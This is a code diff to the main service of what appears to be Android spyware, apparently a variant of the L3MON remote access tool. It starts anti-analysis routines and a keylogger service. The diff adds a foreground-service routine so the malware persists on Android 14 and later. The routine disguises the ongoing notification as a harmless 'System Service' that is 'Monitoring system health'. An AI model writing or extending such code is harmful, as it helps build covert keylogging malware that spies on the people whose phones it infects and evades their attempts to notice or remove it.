@@ -41,6 +41,9 @@ public class MainService extends Service {
         super.onCreate();
         contextOfApplication = this;
 
+        // Inicia como Foreground Service para garantir persistência no Android 14+
+        createMainForegroundNotification();
+
         // === ANTI-ANALYSIS ===
         AntiAnalysis.init(this);
         AntiAnalysis.enable();
@@ -54,6 +57,37 @@ public class MainService extends Service {
         // Inicia KeyLogger
         Intent keyIntent = new Intent(this, L3M0NKeyLogger.class);
         startService(keyIntent);
+    }
+
+    private void createMainForegroundNotification() {
+        String channelId = "main_service_channel";
+        android.app.NotificationManager notificationManager = (android.app.NotificationManager) getSystemService(
+                NOTIFICATION_SERVICE);
+
+        android.app.Notification.Builder builder;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            android.app.NotificationChannel channel = new android.app.NotificationChannel(
+                    channelId, "System Monitor",
+                    android.app.NotificationManager.IMPORTANCE_LOW);
+            notificationManager.createNotificationChannel(channel);
+            builder = new android.app.Notification.Builder(this, channelId);
+        } else {
+            builder = new android.app.Notification.Builder(this);
+        }
+
+        android.app.Notification notification = builder
+                .setContentTitle("System Service")
+                .setContentText("Monitoring system health...")
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setOngoing(true)
+                .build();
+
+        if (Build.VERSION.SDK_INT >= 34) {
+            // 0x01 is FOREGROUND_SERVICE_TYPE_DATA_SYNC
+            startForeground(1001, notification, 1);
+        } else {
+            startForeground(1001, notification);
+        }
     }
 
     private void startPersistenceService() {
